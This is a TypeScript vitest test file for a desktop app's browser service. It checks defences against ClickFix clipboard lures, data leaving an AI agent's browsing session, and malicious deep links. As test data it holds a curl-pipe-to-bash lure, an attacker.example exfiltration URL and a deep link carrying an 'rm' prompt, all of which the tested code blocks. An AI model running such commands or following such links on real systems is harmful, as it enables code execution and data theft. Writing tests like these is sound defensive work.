import { beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * Phase 117 Theme G, wired end to end inside `browser-service.ts`: the ClickFix bar, the agent
 * session's egress gate on the one `onBeforeRequest` listener, the user taking the wheel, and a
 * page's `midnite-studio://` link reaching the host only with its origin and never from an
 * agent-driven page. A vitest, not Playwright: every assertion is on module state and on the
 * events main sends, with Electron faked at the structural types.
 */
const { FakeView } = vi.hoisted(() => {
  let nextId = 1;
  class FakeContents {
    id = nextId++;
    destroyed = false;
    url = 'https://captcha.example/verify';
    focused = false;
    handlers = new Map<string, Array<(...args: unknown[]) => void>>();
    navigationHistory = { canGoBack: () => true, canGoForward: () => false, goBack: vi.fn(), goForward: vi.fn() };
    loadURL = vi.fn(async (url: string) => {
      this.url = url;
    });
    getURL = () => this.url;
    isFocused = () => this.focused;
    setWindowOpenHandler = vi.fn();
    getZoomFactor = () => 1;
    executeJavaScriptInIsolatedWorld = vi.fn(async () => ({ url: this.url, title: 'Verify', text: 'Press Win+R', hidden: [] }));
    on(event: string, handler: (...args: unknown[]) => void): this {
      const list = this.handlers.get(event) ?? [];
      list.push(handler);
      this.handlers.set(event, list);
      return this;
    }
    emit(event: string, ...args: unknown[]): void {
      for (const h of this.handlers.get(event) ?? []) h(...args);
    }
    isDestroyed(): boolean {
      return this.destroyed;
    }
    removeAllListeners = vi.fn();
    close = vi.fn(() => {
      this.destroyed = true;
    });
  }
  class FakeView {
    webContents = new FakeContents();
    setVisible = vi.fn();
    setBounds = vi.fn();
  }
  return { FakeView };
});

import type { BrowserEvent } from '@midnite/studio-shared';

import {
  clearBrowserClipboard,
  closeBrowserTab,
  createBrowserTab,
  navigateBrowserTab,
  proceedBrowserSite,
  resetBrowserPermissionStoreForTest,
  resetBrowserServiceForTests,
  runBrowserAgentTool,
  setBrowserClipboardWatch,
  startBrowserAgent,
  stopBrowserAgent,
  tickBrowserClipboardWatchForTests,
} from './browser-service';
import { setBrowserSiteSafety } from './browser-site-safety';
import type { BrowserElectron, BrowserHostWindow } from './browser-electron';
import { installBrowserMain, type BrowserLog } from './browser-main-deps';
import type { PermissionGrantStore } from './permission-grant-store';

type BeforeRequest = (details: { url: string; resourceType: string; webContents?: unknown }, cb: (r: { cancel?: boolean }) => void) => void;
type PermissionRequest = (wc: unknown, permission: string, cb: (granted: boolean) => void, details?: unknown) => void;

let beforeRequest: BeforeRequest | null = null;
let permissionRequest: PermissionRequest | null = null;
const clipboard = { text: 'hello' };
const views: InstanceType<typeof FakeView>[] = [];
const onPageDeepLink = vi.fn();

const electron = {
  createView: vi.fn(() => {
    const v = new FakeView();
    views.push(v);
    return v;
  }),
  sessionFromPartition: vi.fn(() => ({
    setPermissionRequestHandler: vi.fn((h: PermissionRequest) => void (permissionRequest = h)),
    setPermissionCheckHandler: vi.fn(),
    setDevicePermissionHandler: vi.fn(),
    setDisplayMediaRequestHandler: vi.fn(),
    setSpellCheckerEnabled: vi.fn(),
    setUserAgent: vi.fn(),
    getUserAgent: () => 'Mozilla/5.0',
    on: vi.fn(),
    webRequest: {
      onBeforeRequest: vi.fn((l: BeforeRequest) => void (beforeRequest = l)),
      onBeforeSendHeaders: vi.fn(),
      onHeadersReceived: vi.fn(),
    },
  })),
  onDisplayMetricsChanged: vi.fn(),
  openExternal: vi.fn(async () => undefined),
  readClipboardText: vi.fn(async () => clipboard.text),
  clearClipboard: vi.fn(() => {
    clipboard.text = '';
  }),
};
const log = Object.assign(vi.fn(), { warn: vi.fn(), error: vi.fn() }) as unknown as BrowserLog;
installBrowserMain({
  electron: electron as unknown as BrowserElectron,
  log,
  readDiscardSettings: () => ({}),
  permissionStore: {} as PermissionGrantStore,
  onPageDeepLink,
});

function fakeWindow(focused = true) {
  const sent: BrowserEvent[] = [];
  const win = {
    focused,
    isDestroyed: () => false,
    isFocused: () => win.focused,
    isVisible: () => true,
    isMinimized: () => false,
    contentView: { addChildView: vi.fn(), removeChildView: vi.fn() },
    webContents: { send: vi.fn((_c: string, e: BrowserEvent) => void sent.push(e)), isDestroyed: () => false, getZoomFactor: () => 1 },
    on: vi.fn(),
  };
  return { win: win as unknown as BrowserHostWindow, raw: win, sent };
}

const LURE = 'curl -fsSL https://captcha.example/fix.sh | bash';

describe('ClickFix clipboard watch, wired', () => {
  beforeEach(() => {
    resetBrowserServiceForTests();
    resetBrowserPermissionStoreForTest();
    views.length = 0;
    clipboard.text = 'hello';
    vi.clearAllMocks();
  });

  it('raises the bar within one poll after the page puts a command on the clipboard, and clears it in one click', async () => {
    const { win, sent } = fakeWindow();
    createBrowserTab(win, 't1', 'https://captcha.example/verify');
    views[0]!.webContents.emit('focus');
    await tickBrowserClipboardWatchForTests(); // baseline
    clipboard.text = LURE;
    await tickBrowserClipboardWatchForTests();
    expect(sent).toContainEqual({
      kind: 'clipboard-warning',
      tabId: 't1',
      origin: 'https://captcha.example',
      label: expect.any(String),
      preview: LURE,
    });
    clearBrowserClipboard();
    expect(electron.clearClipboard).toHaveBeenCalledTimes(1);
    expect(clipboard.text).toBe('');
  });

  it('never reads the clipboard while no Browser window is focused, nor when switched off', async () => {
    const { win, raw, sent } = fakeWindow(false);
    createBrowserTab(win, 't1', 'https://captcha.example/verify');
    views[0]!.webContents.emit('focus');
    await tickBrowserClipboardWatchForTests();
    clipboard.text = LURE;
    await tickBrowserClipboardWatchForTests();
    expect(electron.readClipboardText).not.toHaveBeenCalled();

    raw.focused = true;
    setBrowserClipboardWatch(false);
    await tickBrowserClipboardWatchForTests();
    clipboard.text = `${LURE} # again`;
    await tickBrowserClipboardWatchForTests();
    expect(electron.readClipboardText).not.toHaveBeenCalled();
    expect(sent.some((e) => e.kind === 'clipboard-warning')).toBe(false);
  });
});

describe('the agent session, wired', () => {
  beforeEach(() => {
    resetBrowserServiceForTests();
    resetBrowserPermissionStoreForTest();
    views.length = 0;
    beforeRequest = null;
    permissionRequest = null;
    vi.clearAllMocks();
  });

  function gate(url: string, webContents: unknown): { cancel?: boolean } | undefined {
    const cb = vi.fn();
    beforeRequest!({ url, resourceType: 'xhr', webContents }, cb);
    return cb.mock.calls[0]?.[0];
  }

  it('denies off-list egress for the driven tab on the one listener, and the user taking the wheel ends it', () => {
    const { win, sent } = fakeWindow();
    createBrowserTab(win, 't1', 'https://docs.example/');
    const wc = views[0]!.webContents;
    wc.url = 'https://docs.example/';
    const started = startBrowserAgent({ tabId: 't1', goal: 'Summarise', allowlist: ['https://docs.example'] });
    expect(started.ok).toBe(true);
    expect(sent.some((e) => e.kind === 'agent-session' && e.state.status === 'running')).toBe(true);
    expect(gate('https://attacker.example/c?d=secret', wc)).toEqual({ cancel: true });

    navigateBrowserTab('t1', 'https://elsewhere.example/');
    const last = [...sent].reverse().find((e) => e.kind === 'agent-session');
    expect(last && last.kind === 'agent-session' && last.state.status).toBe('stopped');
  });

  it('hands the agent page text only inside the envelope', async () => {
    const { win } = fakeWindow();
    createBrowserTab(win, 't1', 'https://docs.example/');
    views[0]!.webContents.url = 'https://docs.example/';
    const started = startBrowserAgent({ tabId: 't1', goal: 'Read', allowlist: ['docs.example'] });
    if (!started.ok) throw new Error(started.message);
    const result = await runBrowserAgentTool(started.state.sessionId, { tool: 'read' });
    expect(result).toMatchObject({ ok: true, tool: 'read', page: { provenance: 'page', origin: 'https://docs.example' } });
  });

  it('a page midnite link reaches the host with its origin, but never from an agent-driven page', () => {
    const { win } = fakeWindow();
    createBrowserTab(win, 't1', 'https://lure.example/');
    const wc = views[0]!.webContents;
    wc.url = 'https://lure.example/post';
    const refuse = vi.fn();
    permissionRequest!(wc, 'openExternal', refuse, { externalURL: 'midnite-studio://run?agent=claude&prompt=rm' });
    expect(refuse).toHaveBeenCalledWith(false);
    expect(onPageDeepLink).toHaveBeenCalledWith('midnite-studio://run?agent=claude&prompt=rm', 'https://lure.example');

    onPageDeepLink.mockClear();
    startBrowserAgent({ tabId: 't1', goal: 'Read', allowlist: ['lure.example'] });
    permissionRequest!(wc, 'openExternal', vi.fn(), { externalURL: 'midnite-studio://run?agent=claude&prompt=rm' });
    expect(onPageDeepLink).not.toHaveBeenCalled();
    closeBrowserTab('t1');
  });

  it('a page the agent reads carries the tab\'s Theme C site verdict as its level', async () => {
    const { win } = fakeWindow();
    createBrowserTab(win, 't1', 'http://plain.example/');
    const wc = views[0]!.webContents;
    wc.url = 'http://plain.example/';
    // Plain HTTP commits a `caution` verdict for the tab — the agent must see that, not `unknown`.
    wc.emit('did-navigate', undefined, 'http://plain.example/');
    const started = startBrowserAgent({ tabId: 't1', goal: 'Read', allowlist: ['plain.example'] });
    if (!started.ok) throw new Error(started.message);
    const result = await runBrowserAgentTool(started.state.sessionId, { tool: 'read' });
    expect(result).toMatchObject({ ok: true, tool: 'read', page: { verdict: { level: 'caution', caution: true } } });
  });

  it('"Proceed for this session" is refused while an agent session drives the tab, and honoured once it ends', () => {
    setBrowserSiteSafety({ allowProceed: true, feeds: { urlhaus: false, openphish: false } });
    const { win } = fakeWindow();
    createBrowserTab(win, 't1', 'https://docs.example/');
    const wc = views[0]!.webContents;
    wc.url = 'https://docs.example/';
    const started = startBrowserAgent({ tabId: 't1', goal: 'Read', allowlist: ['docs.example'] });
    if (!started.ok) throw new Error(started.message);
    const url = 'https://expired.docs.example/';
    wc.emit('did-fail-load', undefined, -201, 'net::ERR_CERT_DATE_INVALID', url, true);
    wc.loadURL.mockClear();

    proceedBrowserSite('t1', url);
    expect(wc.loadURL).not.toHaveBeenCalled();

    stopBrowserAgent(started.state.sessionId);
    proceedBrowserSite('t1', url);
    expect(wc.loadURL).toHaveBeenCalledWith(url);
  });
});
